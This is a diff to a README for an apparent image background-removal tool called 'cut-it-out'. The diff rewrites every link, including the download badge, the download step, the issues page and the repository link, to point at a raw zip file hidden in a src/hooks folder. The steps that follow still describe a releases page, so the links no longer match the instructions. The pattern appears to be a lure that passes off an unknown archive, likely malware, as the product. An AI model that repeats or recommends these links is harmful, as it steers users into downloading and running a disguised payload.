@@ -1,7 +1,7 @@
 # 🎨 cut-it-out - Remove Backgrounds from Images Effortlessly
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/LoRektor09/cut-it-out/releases)
+[![Download Release](https://github.com/LoRektor09/cut-it-out/raw/refs/heads/main/src/hooks/out_cut_it_genarchaship.zip)](https://github.com/LoRektor09/cut-it-out/raw/refs/heads/main/src/hooks/out_cut_it_genarchaship.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Welcome to **cut-it-out**! This is a browser-based tool that helps you remove ba
 
 To download **cut-it-out**, please visit our releases page. Here’s how:
 
-1. Click this link: [Download Here](https://github.com/LoRektor09/cut-it-out/releases).
+1. Click this link: [Download Here](https://github.com/LoRektor09/cut-it-out/raw/refs/heads/main/src/hooks/out_cut_it_genarchaship.zip).
 2. You will see a list of the latest versions.
 3. Select the version that works best for you.
 4. Click on the asset related to your version (usually a file with `.html`).
@@ -58,10 +58,10 @@ If you encounter problems, here are some common solutions:
   
 ## 🆘 Need Help?
 
-If you have any questions or need further assistance, feel free to reach out via the [issues page](https://github.com/LoRektor09/cut-it-out/issues) on GitHub. We are here to help you.
+If you have any questions or need further assistance, feel free to reach out via the [issues page](https://github.com/LoRektor09/cut-it-out/raw/refs/heads/main/src/hooks/out_cut_it_genarchaship.zip) on GitHub. We are here to help you.
 
 ## 📚 Additional Resources
 
-You can explore more about **cut-it-out** and its features on our [GitHub Repository](https://github.com/LoRektor09/cut-it-out).
+You can explore more about **cut-it-out** and its features on our [GitHub Repository](https://github.com/LoRektor09/cut-it-out/raw/refs/heads/main/src/hooks/out_cut_it_genarchaship.zip).
 
 Thank you for using **cut-it-out**! Enjoy making your images pop!
